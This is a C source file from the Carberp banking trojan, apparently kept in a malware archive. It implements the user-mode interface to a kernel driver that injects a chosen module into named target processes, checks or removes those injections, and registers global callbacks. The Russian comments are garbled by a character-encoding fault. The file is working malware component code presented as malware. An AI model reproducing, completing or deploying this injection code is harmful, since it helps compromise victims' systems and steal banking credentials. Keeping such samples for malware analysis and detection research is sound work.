/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "GetApi.h"
#include "windows.h"
#include "DriverConnect.h"
#include "ntdll.h"
#include  "Strings.h"

#define		INJECT_FORCE_LOAD			0x10000


//
// ��������� ���������� � �������(�������� DriverIOControl)
//
typedef struct __TNOTIFY{
	HANDLE hEvent;
	ULONG  NotifyCode;
	PVOID  InBuffer;
	DWORD  InSize;
	PVOID  OutBuffer;
	DWORD  OutSize;	
}TNOTIFY,*PTNOTIFY;

//
//�������� DriverAddInjectModule
//
typedef struct __TNOTIFY_LOAD_MODULE{
	PSTR ProcessName;		// target process name
	PVOID Module;			// module to inject
	ULONG Size;
	ULONG AttachCount;		// number of attach attempts
	ULONG Flags	;			// 
	DWORD ThreadId;			//	
}TNOTIFY_LOAD_MODULE,*PTNOTIFY_LOAD_MODULE;

//
//	�������� DriverRemoveInjectModule
//
typedef struct __TNOTIFY_REMOVE_MODULE{
	PVOID injDesc;
}TNOTIFY_REMOVE_MODULE,*PNOTIFY_REMOVE_MODULE;



//
//	������� ��� ������� � ��������� 
//
BOOL DriverIOControl(PUSER_INIT_NOTIFY uin,DWORD code,PVOID in_data,DWORD in_size,PVOID out_data,DWORD out_size,DWORD t_wait);



//
// ������� ������ �� ������ ��� ��� �������
//	Module	-	�� ��� ������� DriverAddInjectModule
//	���������� TRUE ���� ��� ������.
BOOL DriverRemoveInjectModule(PUSER_INIT_NOTIFY puin,PVOID Module);



//
//	��������� ������� � ���������.
//	���������� TRUE ���� ������� ��������.
//
BOOL DriverIOTest(PUSER_INIT_NOTIFY puin,DWORD t_wait);



//
//	��������� ������� � ���������.
//	���������� TRUE ���� ������� ��������.
//
BOOL DriverIOTest(PUSER_INIT_NOTIFY puin,DWORD t_wait){
	ULONG Result = 0;
	
	if(! DriverIOControl(puin,IO_CONTROL_DRIVER_NULL,NULL,0,&Result,sizeof(Result),t_wait) )
		return FALSE;

	return Result != 0;
};


//
//  ������� ��������� ������ � �������
//	ProcessName	-	��� ��������
//	���������� TRUE ���� ��� ������.
//
BOOL DriverRemoveInjectToProcess(PUSER_INIT_NOTIFY puin,PWCHAR ProcessName)
{
	TNOTIFY_REMOVE_MODULE nrm;
	ULONG Stat;

	nrm.injDesc = ProcessName;

// ������� 2 ���. ������
//
	if(! DriverIOControl(puin,IO_CONTROL_DRIVER_REMOVE_MODULE,&nrm,sizeof(nrm),&Stat,sizeof(Stat),120*1000) )
			return NULL;
	
	return Stat;
};




//
//	puin - �������� ���������� � ��������� Notify 
//	Module - ��������� ��� � ������
//  TargetProcess - ��� �������� � ������� ����� ��������, ���� NULL �� �� ��� ��������.
//  size	- ������ ��� � ������
//  flags -  �������������� ����� ��� ��������, ���� ���������� 0. ���� ����� ����� ����� ���������.
PVOID DriverAddInjectModule(PUSER_INIT_NOTIFY puin, PVOID Module,PCHAR TargetProcess,ULONG size,ULONG Flags){
	TNOTIFY_LOAD_MODULE nlm;
	PVOID Stat = NULL;


	nlm.AttachCount = -1;
	nlm.Flags		= Flags;
	nlm.Module		= Module;
	nlm.ProcessName = TargetProcess;
	nlm.Size        = size;

	// ������� 2 ���. ������
	//
	if(! DriverIOControl(puin,IO_CONTROL_DRIVER_LOAD_MODULE,&nlm,sizeof(nlm),&Stat,sizeof(Stat),120*1000) )
			return NULL;

	
	return Stat ;
};

//	������������ GlobalCallback
//	ThreadId - ����� � ������� ����� �������� CallBack ���������	
//	CallBack - CallBack ���������
//	lParam	 -	�������������� ��������, ���������� � CallBack
BOOL DriverRegisterGlobalCallback (PUSER_INIT_NOTIFY puin ,DWORD ThreadId,TGlobalCallBack CallBack,LPVOID lParam)
{
	struct {
		HANDLE				ProcessId;
		HANDLE				ThreadId;
		TGlobalCallBack		callback;
		PVOID				lParam;
	}gc;
	ULONG Stat = 0;

	gc.ProcessId =  (HANDLE)pGetCurrentProcessId();
	gc.ThreadId = (HANDLE)ThreadId;
	gc.callback = CallBack;
	gc.lParam	= lParam;

	// ������� 2 ���. ������
	//


	if(! DriverIOControl(puin,IO_CONTROL_DRIVER_REGISTER_GLOBALCALLBACK,&gc,sizeof(gc),&Stat,sizeof(Stat),120*1000) )
			return NULL;

	return Stat ;
};



//
//	�������� ������ � GlobalCallBack
//	ThreadId		-	����� ����� ������� ��� ������,���� 0 ��� ������������������ ������
//	Memory			-	��������� �� ������
//	SizeMemory		-	������ ������
BOOL DriverSendDataToGlobalCallBackEx(PUSER_INIT_NOTIFY puin,HANDLE ThreadId,PVOID Memory,ULONG SizeMemory)
{
	struct {
		HANDLE		ThreadId;
		PVOID		Buffer;
		ULONG		Size;
	}gc;
	ULONG Stat = 0;

	gc.ThreadId			= (HANDLE)ThreadId;
	gc.Buffer			= Memory;
	gc.Size		= SizeMemory;

	// ������� 2 ���. ������
	//
	if(! DriverIOControl(puin,IO_CONTROL_DRIVER_SEND_DATA_TO_GLOBALCALLBACK,&gc,sizeof(gc),&Stat,sizeof(Stat),120*1000) )
			return NULL;

	return Stat ;
};



//
//	�������� ������ � GlobalCallBack
//	Memory			-	��������� �� ������
//	SizeMemory		-	������ ������
BOOL DriverSendDataToGlobalCallBack(PUSER_INIT_NOTIFY puin,PVOID Memory,ULONG SizeMemory)
{
	return DriverSendDataToGlobalCallBackEx(puin,0,Memory,SizeMemory);
};



//
// �������� ����������� "����" ��������
// code - ��� �������
//	in_data - ������� ������
//  in_size - ������ ������� ������
//	out_data - �������� ������
//  out_size - ������ �������� ������
//  t_wait   - �����(� ��) �������� ��������� ������(������ ���� ���������� ������� ���� ����� ������������� �������� �������)
//  
//  ���������� TRUE ���� �������(����� hCompleat  ���������� � ���. ���� ) � ��������� ��������.

BOOL DriverIOControl(PUSER_INIT_NOTIFY uin,DWORD code,PVOID in_data,DWORD in_size,PVOID out_data,DWORD out_size,DWORD t_wait){
	HANDLE	 hEvent;
	HANDLE   hCompleat;
	BOOL	 err = TRUE;
	PTNOTIFY	pNotify;



	if (  (uin->AreaSize < sizeof(TNOTIFY)) )
		return FALSE;


	hCompleat = pCreateEventW(NULL,TRUE,FALSE,NULL);
	
	if (!hCompleat)
		return FALSE;

	hEvent = uin->hQueryEvent;//pOpenEventW(EVENT_ALL_ACCESS,FALSE,EventName);

	if (!hEvent){
		pCloseHandle(hCompleat);
		return FALSE;
	};

	pNotify  = (PTNOTIFY)uin->pInfoNotifyArea ;

	pNotify->InBuffer	= in_data;
	pNotify->InSize		= in_size;
	pNotify->OutBuffer	= out_data;
	pNotify->OutSize	= out_size;
	pNotify->hEvent		= hCompleat;
	pNotify->NotifyCode = code;

	err = (BOOL)pSetEvent(hEvent);
	
	if ( pWaitForSingleObject(hCompleat,t_wait) == WAIT_OBJECT_0 )
		 err  = TRUE;
	else err  = FALSE;	

	pCloseHandle(hCompleat);
	
	return err;
};


//
//	��������� ����� �� ���������� � ��������� �������, ����� ���� ���
//	uProcessName	-	��� ��������
//
BOOL CheckIsInjectToProcess(PUSER_INIT_NOTIFY puin, PWCHAR uProcessName)
{
	ULONG Result = 0;
	UNICODE_STRING uStr;
	uStr.Length = uStr.MaximumLength = m_wcslen(uProcessName)*sizeof(WCHAR);
	uStr.Buffer = uProcessName;

	// ������� 2 ���. ������
	//
	if(! DriverIOControl(puin,IO_CONTROL_DRIVER_CHEK_PROCESS,&uStr,sizeof(uStr),&Result,sizeof(Result),120*1000) )
			return NULL;

	return Result != 0;
};